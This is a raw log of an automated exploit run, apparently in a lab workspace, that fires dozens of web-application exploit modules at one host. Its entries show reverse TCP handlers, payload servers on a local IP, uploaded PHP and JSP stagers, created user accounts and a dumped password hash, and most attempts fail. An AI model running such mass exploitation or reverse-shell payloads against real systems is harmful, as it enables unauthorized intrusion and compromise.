[+] [2016.06.04-09:55:15] Workspace:lab5 Progress:395/775 (50%) [391/770] 10.198.0.1:8080 - Drupal HTTP Parameter Key/Value SQL Injection
[*] [2016.06.04-09:55:15] [0391] Started reverse TCP handler on 0.0.0.0:1269
[*] [2016.06.04-09:55:15] [0391] Testing page
[*] [2016.06.04-09:55:15] [0391] form_build_id:
[*] [2016.06.04-09:55:15] [0391] form_token:
[*] [2016.06.04-09:55:15] [0391] password hash: $P\$8pupzswtucwCjARnQQW1hVxTS5.77D1
[*] [2016.06.04-09:55:15] [0391] Creating new user wHHsAYFnZU:hlGMIuskUb
[*] [2016.06.04-09:55:15] [0391] Logging in as wHHsAYFnZU:hlGMIuskUb
[-] [2016.06.04-09:55:15] [0391] Exploit aborted due to failure: unknown: No response or response body, bailing.
[+] [2016.06.04-09:55:16] Workspace:lab5 Progress:396/775 (51%) [392/770] 10.198.0.1:8080 - AlienVault OSSIM av-centerd Command Injection
[-] [2016.06.04-09:55:16] No reverse connect payloads available for exploit/linux/ids/alienvault_centerd_soap_exec
[-] [2016.06.04-09:55:16] No payloads were compatible with exploit/linux/ids/alienvault_centerd_soap_exec)
[-] [2016.06.04-09:55:16] [0392] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:55:16] Workspace:lab5 Progress:397/775 (51%) [393/770] 10.198.0.1:80 - Symantec Web Gateway 5.0.2.18 pbcontrol.php Command Injection
[-] [2016.06.04-09:55:16] No reverse connect payloads available for exploit/linux/http/symantec_web_gateway_pbcontrol
[-] [2016.06.04-09:55:16] No payloads were compatible with exploit/linux/http/symantec_web_gateway_pbcontrol)
[-] [2016.06.04-09:55:16] [0393] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:55:17] Workspace:lab5 Progress:398/775 (51%) [394/770] 10.198.0.1:8080 - Centreon SQL and Command Injection
[-] [2016.06.04-09:55:17] No reverse connect payloads available for exploit/linux/http/centreon_sqli_exec
[-] [2016.06.04-09:55:17] No payloads were compatible with exploit/linux/http/centreon_sqli_exec)
[-] [2016.06.04-09:55:17] [0394] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:55:17] Workspace:lab5 Progress:399/775 (51%) [395/770] 10.198.0.1:80 - Dell SonicWALL (Plixer) Scrutinizer 9 SQL Injection
[*] [2016.06.04-09:55:17] [0395] Started reverse TCP handler on 0.0.0.0:1270
[*] [2016.06.04-09:55:17] [0395] Sending SQL injection...
[-] [2016.06.04-09:55:18] [0395] I don't think the SQL Injection attempt worked
[+] [2016.06.04-09:55:20] Workspace:lab5 Progress:400/775 (51%) [396/770] 10.198.0.1:80 - Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
[*] [2016.06.04-09:55:20] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:55:20] [0396] Started reverse TCP handler on 0.0.0.0:1271
[*] [2016.06.04-09:55:21] [0396] 10.198.0.1:80 - Uploading 11029 bytes via MySQL...
[-] [2016.06.04-09:55:21] [0396] 10.198.0.1:3306 - Connection refused
[-] [2016.06.04-09:55:21] [0396] 10.198.0.1:3306 - That MySQL upload didn't work.
[+] [2016.06.04-09:55:37] Workspace:lab5 Progress:401/775 (51%) [397/770] 10.198.0.1:8080 - Gitlist Unauthenticated Remote Command Execution
[-] [2016.06.04-09:55:37] No reverse connect payloads available for exploit/linux/http/gitlist_exec
[-] [2016.06.04-09:55:37] No payloads were compatible with exploit/linux/http/gitlist_exec)
[-] [2016.06.04-09:55:37] [0397] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:55:38] Workspace:lab5 Progress:402/775 (51%) [398/770] 10.198.0.1:8080 - Wordpress SlideShow Gallery Authenticated File Upload
[+] [2016.06.04-09:55:39] Workspace:lab5 Progress:403/775 (52%) [399/770] 10.198.0.1:8080 - Wordpress InfusionSoft Upload Vulnerability
[*] [2016.06.04-09:55:39] [0399] Started reverse TCP handler on 0.0.0.0:1273
[-] [2016.06.04-09:55:39] [0399] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-09:55:39] Workspace:lab5 Progress:404/775 (52%) [400/770] 10.198.0.1:8080 - Joomla Akeeba Kickstart Unserialize Remote Code Execution
[*] [2016.06.04-09:55:39] [0400] Started reverse TCP handler on 0.0.0.0:1274
[*] [2016.06.04-09:55:39] [0400] Using URL: http://0.0.0.0:1275/4Z3lg8Fe9ijXWy
[*] [2016.06.04-09:55:39] [0400] Local IP: http://10.0.2.15:1275/4Z3lg8Fe9ijXWy
[*] [2016.06.04-09:55:39] [0400] Server started.
[*] [2016.06.04-09:55:39] [0400] Creating archive with file vfbAYUAEycA.php
[*] [2016.06.04-09:55:39] [0400] Sending PHP serialized object...
[*] [2016.06.04-09:55:39] [0400] 404
<!DOCTYPE html><html><head><title>Apache Tomcat/8.0.14 (Debian) - Error report</title><style type="text/css">H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}.line {height: 1px; background-color: #525D76; border: none;}</style> </head><body><h1>HTTP Status 404 - /joomla/administrator/components/com_joomlaupdate/restore.php</h1><div class="line"></div><p><b>type</b> Status report</p><p><b>message</b> <u>/joomla/administrator/components/com_joomlaupdate/restore.php</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><hr class="line"><h3>Apache Tomcat/8.0.14 (Debian)</h3></body></html>
[-] [2016.06.04-09:55:39] [0400] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Unexpected response
[*] [2016.06.04-09:55:39] [0400] Server stopped.
[+] [2016.06.04-09:55:40] Workspace:lab5 Progress:405/775 (52%) [401/770] 10.198.0.1:80 - Cyclope Employee Surveillance Solution v6 SQL Injection
[*] [2016.06.04-09:55:40] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:55:40] [0401] Started reverse TCP handler on 0.0.0.0:1276
[-] [2016.06.04-09:55:40] [0401] Unable to determine the version number
[+] [2016.06.04-09:56:00] Workspace:lab5 Progress:406/775 (52%) [402/770] 10.198.0.1:80 - CuteFlow v2.11.2 Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:56:01] [0402] Started reverse TCP handler on 0.0.0.0:1277
[*] [2016.06.04-09:56:01] [0402] Uploading PHP payload (1285 bytes)
[*] [2016.06.04-09:56:01] [0402] Retrieving file: UlvfJQF.php
[+] [2016.06.04-09:56:04] Workspace:lab5 Progress:407/775 (52%) [403/770] 10.198.0.1:80 - Oracle Business Transaction Management FlashTunnelService Remote Code Execution
[*] [2016.06.04-09:56:04] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:56:04] No reverse connect payloads available for exploit/windows/http/oracle_btm_writetofile
[-] [2016.06.04-09:56:04] No payloads were compatible with exploit/windows/http/oracle_btm_writetofile)
[-] [2016.06.04-09:56:04] [0403] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:56:05] Workspace:lab5 Progress:408/775 (52%) [404/770] 10.198.0.1:8080 - Visual Mining NetCharts Server Remote Code Execution
[-] [2016.06.04-09:56:05] No reverse connect payloads available for exploit/multi/http/visual_mining_netcharts_upload
[-] [2016.06.04-09:56:05] No payloads were compatible with exploit/multi/http/visual_mining_netcharts_upload)
[-] [2016.06.04-09:56:05] [0404] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:56:05] Workspace:lab5 Progress:409/775 (52%) [405/770] 10.198.0.1:80 - XODA 0.4.5 Arbitrary PHP File Upload Vulnerability
[*] [2016.06.04-09:56:05] [0405] Started reverse TCP handler on 0.0.0.0:1278
[*] [2016.06.04-09:56:05] [0405] Sending PHP payload (tPQJAzFWiif.php)
[*] [2016.06.04-09:56:05] [0405] Executing PHP payload (tPQJAzFWiif.php)
[*] [2016.06.04-09:56:06] [0405] Server returned 302
[+] [2016.06.04-09:56:08] Workspace:lab5 Progress:410/775 (52%) [406/770] 10.198.0.1:80 - Webmin /file/show.cgi Remote Command Execution
[-] [2016.06.04-09:56:08] No reverse connect payloads available for exploit/unix/webapp/webmin_show_cgi_exec
[-] [2016.06.04-09:56:08] No payloads were compatible with exploit/unix/webapp/webmin_show_cgi_exec)
[+] [2016.06.04-09:56:09] Workspace:lab5 Progress:411/775 (53%) [407/770] 10.198.0.1:80 - WAN Emulator v2.3 Command Execution
[-] [2016.06.04-09:56:09] No reverse connect payloads available for exploit/linux/http/wanem_exec
[-] [2016.06.04-09:56:09] No payloads were compatible with exploit/linux/http/wanem_exec)
[-] [2016.06.04-09:56:09] [0407] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:56:10] Workspace:lab5 Progress:412/775 (53%) [408/770] 10.198.0.1:8080 - Lexmark MarkVision Enterprise Arbitrary File Upload
[-] [2016.06.04-09:56:10] No reverse connect payloads available for exploit/windows/http/lexmark_markvision_gfd_upload
[-] [2016.06.04-09:56:10] No payloads were compatible with exploit/windows/http/lexmark_markvision_gfd_upload)
[-] [2016.06.04-09:56:10] [0408] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:56:10] Workspace:lab5 Progress:413/775 (53%) [409/770] 10.198.0.1:80 - TestLink v1.9.3 Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:56:10] [0409] Started reverse TCP handler on 0.0.0.0:1279
[*] [2016.06.04-09:56:10] [0409] Registering user (S6RJaM)
[-] [2016.06.04-09:56:10] [0409] Registration failed
[+] [2016.06.04-09:56:13] Workspace:lab5 Progress:414/775 (53%) [410/770] 10.198.0.1:80 - E-Mail Security Virtual Appliance learn-msg.cgi Command Injection
[-] [2016.06.04-09:56:13] No reverse connect payloads available for exploit/linux/http/esva_exec
[-] [2016.06.04-09:56:13] No payloads were compatible with exploit/linux/http/esva_exec)
[-] [2016.06.04-09:56:13] [0410] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:56:14] Workspace:lab5 Progress:415/775 (53%) [411/770] 10.198.0.1:80 - MobileCartly 1.0 Arbitrary File Creation Vulnerability
[*] [2016.06.04-09:56:14] [0411] Started reverse TCP handler on 0.0.0.0:1280
[*] [2016.06.04-09:56:14] [0411] Uploading payload
[*] [2016.06.04-09:56:14] [0411] Requesting 'DBiiJ.php'
[+] [2016.06.04-09:56:17] Workspace:lab5 Progress:416/775 (53%) [412/770] 10.198.0.1:8080 - WordPress Holding Pattern Theme Arbitrary File Upload
[*] [2016.06.04-09:56:17] [0412] Started reverse TCP handler on 0.0.0.0:1281
[*] [2016.06.04-09:56:17] [0412] Preparing payload...
[*] [2016.06.04-09:56:17] [0412] Uploading payload...
[-] [2016.06.04-09:56:17] [0412] Exploit aborted due to failure: unexpected-reply: Server responded with status code 404
[+] [2016.06.04-09:56:17] Workspace:lab5 Progress:417/775 (53%) [413/770] 10.198.0.1:80 - Auxilium RateMyPet Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:56:18] [0413] Started reverse TCP handler on 0.0.0.0:1282
[*] [2016.06.04-09:56:18] [0413] Uploading payload (1312 bytes)...
[*] [2016.06.04-09:56:18] [0413] Requesting 'Fapap.php'...
[+] [2016.06.04-09:56:20] Workspace:lab5 Progress:418/775 (53%) [414/770] 10.198.0.1:8080 - ElasticSearch Search Groovy Sandbox Bypass
[*] [2016.06.04-09:56:21] [0414] Started reverse TCP handler on 0.0.0.0:1283
[*] [2016.06.04-09:56:21] [0414] Checking vulnerability...
[*] [2016.06.04-09:56:21] [0414] Trying to get a reference to java.lang.Runtime...
[-] [2016.06.04-09:56:21] [0414] Target answered with HTTP code 404 (with a body)
[*] [2016.06.04-09:56:21] [0414] no response to test
[-] [2016.06.04-09:56:21] [0414] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Java has not been executed, aborting...
[+] [2016.06.04-09:56:21] Workspace:lab5 Progress:419/775 (54%) [415/770] 10.198.0.1:80 - ZEN Load Balancer Filelog Command Execution
[-] [2016.06.04-09:56:21] No reverse connect payloads available for exploit/linux/http/zen_load_balancer_exec
[-] [2016.06.04-09:56:21] No payloads were compatible with exploit/linux/http/zen_load_balancer_exec)
[-] [2016.06.04-09:56:21] [0415] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:56:22] Workspace:lab5 Progress:420/775 (54%) [416/770] 10.198.0.1:8080 - Symantec Endpoint Protection Manager Authentication Bypass and Code Execution
[*] [2016.06.04-09:56:22] [0416] Started reverse TCP handler on 0.0.0.0:1284
[*] [2016.06.04-09:56:22] [0416] Getting cookie...
[-] [2016.06.04-09:56:42] [0416] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv2/v3 read server hello A
[+] [2016.06.04-09:56:42] Workspace:lab5 Progress:421/775 (54%) [417/770] 10.198.0.1:80 - Project Pier Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:56:42] [0417] Started reverse TCP handler on 0.0.0.0:1285
[*] [2016.06.04-09:56:42] [0417] Uploading PHP payload (973 bytes)...
[*] [2016.06.04-09:56:42] [0417] Executing 'ZcEWV.php.1'...
[+] [2016.06.04-09:56:45] Workspace:lab5 Progress:422/775 (54%) [418/770] 10.198.0.1:8080 - Maarch LetterBox Unrestricted File Upload
[*] [2016.06.04-09:56:45] [0418] Started reverse TCP handler on 0.0.0.0:1286
[*] [2016.06.04-09:56:45] [0418] Preparing payload...
[*] [2016.06.04-09:56:45] [0418] Uploading payload...
[-] [2016.06.04-09:56:45] [0418] Exploit aborted due to failure: unexpected-reply: Server responded with status code 404
[+] [2016.06.04-09:56:46] Workspace:lab5 Progress:423/775 (54%) [419/770] 10.198.0.1:80 - ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection
[*] [2016.06.04-09:56:46] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:56:46] [0419] Started reverse TCP handler on 0.0.0.0:1287
[-] [2016.06.04-09:56:46] [0419] 10.198.0.1:80 - Unable to select a target, we must bail.
[+] [2016.06.04-09:57:06] Workspace:lab5 Progress:424/775 (54%) [420/770] 10.198.0.1:80 - Invision IP.Board unserialize() PHP Code Execution
[*] [2016.06.04-09:57:06] [0420] Started reverse TCP handler on 0.0.0.0:1288
[*] [2016.06.04-09:57:06] [0420] Exploiting the unserialize() to upload PHP code
[*] [2016.06.04-09:57:06] [0420] Checking for cookie prefix
[-] [2016.06.04-09:57:07] [0420] Exploit failed: 302
[+] [2016.06.04-09:57:09] Workspace:lab5 Progress:425/775 (54%) [421/770] 10.198.0.1:80 - PhpTax pfilez Parameter Exec Remote Code Injection
[-] [2016.06.04-09:57:09] No reverse connect payloads available for exploit/multi/http/phptax_exec
[-] [2016.06.04-09:57:09] No payloads were compatible with exploit/multi/http/phptax_exec)
[-] [2016.06.04-09:57:09] [0421] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:10] Workspace:lab5 Progress:426/775 (54%) [422/770] 10.198.0.1:80 - WordPress Plugin Advanced Custom Fields Remote File Inclusion
[*] [2016.06.04-09:57:10] [0422] Started reverse TCP handler on 0.0.0.0:1289
[*] [2016.06.04-09:57:10] [0422] Using URL: http://0.0.0.0:1290/7GP06hOO3Phibt
[*] [2016.06.04-09:57:10] [0422] Local IP: http://10.0.2.15:1290/7GP06hOO3Phibt
[*] [2016.06.04-09:57:10] [0422] PHP include server started.
[*] [2016.06.04-09:57:10] [0422] Sending request
[-] [2016.06.04-09:57:10] [0422] Exploit aborted due to failure: unexpected-reply: Unexpected reply - 302
[+] [2016.06.04-09:57:11] Workspace:lab5 Progress:427/775 (55%) [423/770] 10.198.0.1:8080 - PHPMoAdmin 1.1.2 Remote Code Execution
[*] [2016.06.04-09:57:11] [0423] Started reverse TCP handler on 0.0.0.0:1291
[*] [2016.06.04-09:57:11] [0423] Executing payload...
[+] [2016.06.04-09:57:14] Workspace:lab5 Progress:428/775 (55%) [424/770] 10.198.0.1:80 - Narcissus Image Configuration Passthru Vulnerability
[-] [2016.06.04-09:57:14] No reverse connect payloads available for exploit/unix/webapp/narcissus_backend_exec
[-] [2016.06.04-09:57:14] No payloads were compatible with exploit/unix/webapp/narcissus_backend_exec)
[-] [2016.06.04-09:57:14] [0424] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:14] Workspace:lab5 Progress:429/775 (55%) [425/770] 10.198.0.1:8080 - Solarwinds Firewall Security Manager 6.6.5 Client Session Handling Vulnerability
[*] [2016.06.04-09:57:14] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:57:15] [0425] Started reverse TCP handler on 0.0.0.0:1292
[-] [2016.06.04-09:57:15] [0425] Exploit aborted due to failure: not-vulnerable: Target does not appear to be a Solarwinds Firewall Security Manager
[+] [2016.06.04-09:57:15] Workspace:lab5 Progress:430/775 (55%) [426/770] 10.198.0.1:8080 - Accellion FTA getStatus verify_oauth_token Command Execution
[-] [2016.06.04-09:57:15] No reverse connect payloads available for exploit/linux/http/accellion_fta_getstatus_oauth
[-] [2016.06.04-09:57:15] No payloads were compatible with exploit/linux/http/accellion_fta_getstatus_oauth)
[-] [2016.06.04-09:57:15] [0426] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:16] Workspace:lab5 Progress:431/775 (55%) [427/770] 10.198.0.1:80 - Adobe IndesignServer 5.5 SOAP Server Arbitrary Script Execution
[*] [2016.06.04-09:57:16] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:57:16] No reverse connect payloads available for exploit/multi/misc/indesign_server_soap
[-] [2016.06.04-09:57:16] No payloads were compatible with exploit/multi/misc/indesign_server_soap)
[-] [2016.06.04-09:57:16] [0427] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:16] Workspace:lab5 Progress:432/775 (55%) [428/770] 10.198.0.1:8080 - SysAid Help Desk Administrator Portal Arbitrary File Upload
[*] [2016.06.04-09:57:16] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[+] [2016.06.04-09:57:17] Workspace:lab5 Progress:433/775 (55%) [429/770] 10.198.0.1:80 - Ektron 8.02 XSLT Transform Remote Code Execution
[*] [2016.06.04-09:57:17] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:57:17] [0429] Started reverse TCP handler on 0.0.0.0:1294
[*] [2016.06.04-09:57:17] [0429] Generating the EXE Payload and the XSLT...
[*] [2016.06.04-09:57:17] [0429] Trying to run the xslt transformation...
[-] [2016.06.04-09:57:17] [0429] Exploit aborted due to failure: unknown: There was an unexpected response to the xslt transformation request
[+] [2016.06.04-09:57:17] Workspace:lab5 Progress:434/775 (56%) [430/770] 10.198.0.1:8080 - SysAid Help Desk 'rdslogs' Arbitrary File Upload
[*] [2016.06.04-09:57:18] [0430] Started reverse TCP handler on 0.0.0.0:1295
[*] [2016.06.04-09:57:18] [0430] Creating upload directory
[*] [2016.06.04-09:57:18] [0430] Uploading WAR file...
[-] [2016.06.04-09:57:18] [0430] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - WAR upload failed
[+] [2016.06.04-09:57:18] Workspace:lab5 Progress:435/775 (56%) [431/770] 10.198.0.1:80 - TWiki MAKETEXT Remote Command Execution
[-] [2016.06.04-09:57:18] No reverse connect payloads available for exploit/unix/webapp/twiki_maketext
[-] [2016.06.04-09:57:18] No payloads were compatible with exploit/unix/webapp/twiki_maketext)
[-] [2016.06.04-09:57:18] [0431] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:19] Workspace:lab5 Progress:436/775 (56%) [432/770] 10.198.0.1:80 - Foswiki MAKETEXT Remote Command Execution
[-] [2016.06.04-09:57:19] No reverse connect payloads available for exploit/unix/webapp/foswiki_maketext
[-] [2016.06.04-09:57:19] No payloads were compatible with exploit/unix/webapp/foswiki_maketext)
[-] [2016.06.04-09:57:19] [0432] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:19] Workspace:lab5 Progress:437/775 (56%) [433/770] 10.198.0.1:8080 - Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution
[-] [2016.06.04-09:57:19] No reverse connect payloads available for exploit/multi/http/rails_web_console_v2_code_exec
[-] [2016.06.04-09:57:19] No payloads were compatible with exploit/multi/http/rails_web_console_v2_code_exec)
[-] [2016.06.04-09:57:19] [0433] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:20] Workspace:lab5 Progress:438/775 (56%) [434/770] 10.198.0.1:8080 - ProFTPD 1.3.5 Mod_Copy Command Execution
[-] [2016.06.04-09:57:20] No reverse connect payloads available for exploit/unix/ftp/proftpd_modcopy_exec
[-] [2016.06.04-09:57:20] No payloads were compatible with exploit/unix/ftp/proftpd_modcopy_exec)
[-] [2016.06.04-09:57:20] [0434] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:21] Workspace:lab5 Progress:439/775 (56%) [435/770] 10.198.0.1:8080 - F5 iControl iCall::Script Root Command Execution
[-] [2016.06.04-09:57:21] No reverse connect payloads available for exploit/linux/http/f5_icall_cmd
[-] [2016.06.04-09:57:21] No payloads were compatible with exploit/linux/http/f5_icall_cmd)
[-] [2016.06.04-09:57:21] [0435] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:21] Workspace:lab5 Progress:440/775 (56%) [436/770] 10.198.0.1:8080 - Atlassian HipChat for Jira Plugin Velocity Template Injection
[*] [2016.06.04-09:57:21] [0436] Started reverse TCP handler on 0.0.0.0:1296
[-] [2016.06.04-09:57:21] [0436] 10.198.0.1:8080 - Exploit aborted due to failure: bad-config: Jira username and password are required.
[+] [2016.06.04-09:57:22] Workspace:lab5 Progress:441/775 (56%) [437/770] 10.198.0.1:8080 - Kaseya VSA uploader.aspx Arbitrary File Upload
[*] [2016.06.04-09:57:22] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:57:22] [0437] Started reverse TCP handler on 0.0.0.0:1297
[-] [2016.06.04-09:57:22] [0437] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Failed to create a valid session
[+] [2016.06.04-09:57:22] Workspace:lab5 Progress:442/775 (57%) [438/770] 10.198.0.1:80 - eXtplorer v2.1 Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:57:22] [0438] Started reverse TCP handler on 0.0.0.0:1298
[*] [2016.06.04-09:57:23] [0438] Authenticating as user (admin)
[-] [2016.06.04-09:57:23] [0438] Exploit aborted due to failure: no-access: 10.198.0.1:80 - Authentication failed
[+] [2016.06.04-09:57:23] Workspace:lab5 Progress:443/775 (57%) [439/770] 10.198.0.1:80 - Wordpress Reflex Gallery Upload Vulnerability
[*] [2016.06.04-09:57:23] [0439] Started reverse TCP handler on 0.0.0.0:1299
[-] [2016.06.04-09:57:23] [0439] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Unable to deploy payload, server returned 302
[+] [2016.06.04-09:57:24] Workspace:lab5 Progress:444/775 (57%) [440/770] 10.198.0.1:80 - Ruby on Rails XML Processor YAML Deserialization Code Execution
[-] [2016.06.04-09:57:24] No reverse connect payloads available for exploit/multi/http/rails_xml_yaml_code_exec
[-] [2016.06.04-09:57:24] No payloads were compatible with exploit/multi/http/rails_xml_yaml_code_exec)
[-] [2016.06.04-09:57:24] [0440] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:24] Workspace:lab5 Progress:445/775 (57%) [441/770] 10.198.0.1:8080 - vBulletin 5.1.2 Unserialize Code Execution
[*] [2016.06.04-09:57:24] [0441] Started reverse TCP handler on 0.0.0.0:1300
[*] [2016.06.04-09:57:24] [0441] Trying to inferprint the instance...
[-] [2016.06.04-09:57:25] [0441] Exploit aborted due to failure: no-target: 10.198.0.1:8080 - Failed to detect a vulnerable instance
[+] [2016.06.04-09:57:25] Workspace:lab5 Progress:446/775 (57%) [442/770] 10.198.0.1:8080 - Joomla Content History SQLi Remote Code Execution
[*] [2016.06.04-09:57:25] [0442] Started reverse TCP handler on 0.0.0.0:1301
[-] [2016.06.04-09:57:25] [0442] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Error retrieving table prefix
[+] [2016.06.04-09:57:25] Workspace:lab5 Progress:447/775 (57%) [443/770] 10.198.0.1:8080 - ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
[*] [2016.06.04-09:57:25] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:57:26] [0443] Started reverse TCP handler on 0.0.0.0:1302
[*] [2016.06.04-09:57:26] [0443] Creating JSP stager
[*] [2016.06.04-09:57:27] [0443] Uploading JSP stager KSOHk.jsp...
[-] [2016.06.04-09:57:27] [0443] Exploit aborted due to failure: unknown: The server returned 404, but 200 was expected.
[!] [2016.06.04-09:57:27] [0443] This exploit may require manual cleanup of '../webapps/DesktopCentral/jspf/KSOHk.jsp' on the target
[+] [2016.06.04-09:57:27] Workspace:lab5 Progress:448/775 (57%) [444/770] 10.198.0.1:80 - PHP-Charts v1.0 PHP Code Execution Vulnerability
[-] [2016.06.04-09:57:27] No reverse connect payloads available for exploit/unix/webapp/php_charts_exec
[-] [2016.06.04-09:57:27] No payloads were compatible with exploit/unix/webapp/php_charts_exec)
[-] [2016.06.04-09:57:27] [0444] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:28] Workspace:lab5 Progress:449/775 (57%) [445/770] 10.198.0.1:80 - ZoneMinder Video Server packageControl Command Execution
[-] [2016.06.04-09:57:28] No reverse connect payloads available for exploit/unix/webapp/zoneminder_packagecontrol_exec
[-] [2016.06.04-09:57:28] No payloads were compatible with exploit/unix/webapp/zoneminder_packagecontrol_exec)
[-] [2016.06.04-09:57:28] [0445] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:28] Workspace:lab5 Progress:450/775 (58%) [446/770] 10.198.0.1:8080 - Joomla HTTP Header Unauthenticated Remote Code Execution
[*] [2016.06.04-09:57:28] [0446] Started reverse TCP handler on 0.0.0.0:1303
[-] [2016.06.04-09:57:29] [0446] 10.198.0.1:8080 - Unable to determine the PHP version.
[*] [2016.06.04-09:57:29] [0446] 10.198.0.1:8080 - Sending payload ...
[+] [2016.06.04-09:57:31] Workspace:lab5 Progress:451/775 (58%) [447/770] 10.198.0.1:80 - Ruby on Rails JSON Processor YAML Deserialization Code Execution
[-] [2016.06.04-09:57:31] No reverse connect payloads available for exploit/multi/http/rails_json_yaml_code_exec
[-] [2016.06.04-09:57:31] No payloads were compatible with exploit/multi/http/rails_json_yaml_code_exec)
[-] [2016.06.04-09:57:31] [0447] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:57:32] Workspace:lab5 Progress:452/775 (58%) [448/770] 10.198.0.1:8080 - Advantech WebAccess Dashboard Viewer Arbitrary File Upload
[*] [2016.06.04-09:57:32] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:57:32] [0448] Started reverse TCP handler on 0.0.0.0:1304
[*] [2016.06.04-09:57:32] [0448] 10.198.0.1:8080 - Cannot reliably check exploitability.
[+] [2016.06.04-10:00:06] Workspace:lab5 Progress:453/775 (58%) [449/770] 10.198.0.1:8080 - NETGEAR ProSafe Network Management System 300 Arbitrary File Upload
[*] [2016.06.04-10:00:06] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:00:06] [0449] Started reverse TCP handler on 0.0.0.0:1305
[*] [2016.06.04-10:00:07] [0449] 10.198.0.1:8080 - Uploading payload...
[-] [2016.06.04-10:00:07] [0449] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Payload upload failed
[+] [2016.06.04-10:00:08] Workspace:lab5 Progress:454/775 (58%) [450/770] 10.198.0.1:8080 - Novell ServiceDesk Authenticated File Upload
[*] [2016.06.04-10:00:08] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:00:08] [0450] Started reverse TCP handler on 0.0.0.0:1306
[-] [2016.06.04-10:00:08] [0450] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Failed to get the login URL.
[+] [2016.06.04-10:00:08] Workspace:lab5 Progress:455/775 (58%) [451/770] 10.198.0.1:80 - D-Link Devices Unauthenticated Remote Command Execution
[-] [2016.06.04-10:00:08] No reverse connect payloads available for exploit/linux/http/dlink_command_php_exec_noauth
[-] [2016.06.04-10:00:08] No payloads were compatible with exploit/linux/http/dlink_command_php_exec_noauth)
[*] [2016.06.04-10:00:09] [0451] 10.198.0.1:80 - Telnet port used: 53077
[*] [2016.06.04-10:00:09] [0451] 10.198.0.1:80 - Sending exploit request...
[*] [2016.06.04-10:00:09] [0451] 10.198.0.1:80 - Trying to establish a telnet connection...
[-] [2016.06.04-10:00:09] [0451] Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.198.0.1:53077).
[+] [2016.06.04-10:00:09] Workspace:lab5 Progress:456/775 (58%) [452/770] 10.198.0.1:8080 - ATutor 2.2.1 SQL Injection / Remote Code Execution
[*] [2016.06.04-10:00:09] [0452] Started reverse TCP handler on 0.0.0.0:1307
[*] [2016.06.04-10:00:09] [0452] 10.198.0.1:8080 - Dumping the username and password hash...
[+] [2016.06.04-10:00:10] [0452] 10.198.0.1:8080 - Got the 's hash:  !
[-] [2016.06.04-10:00:10] [0452] 10.198.0.1:8080 - Exploit failed: TypeError no implicit conversion of nil into String
[+] [2016.06.04-10:00:10] Workspace:lab5 Progress:457/775 (58%) [453/770] 10.198.0.1:80 - Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability
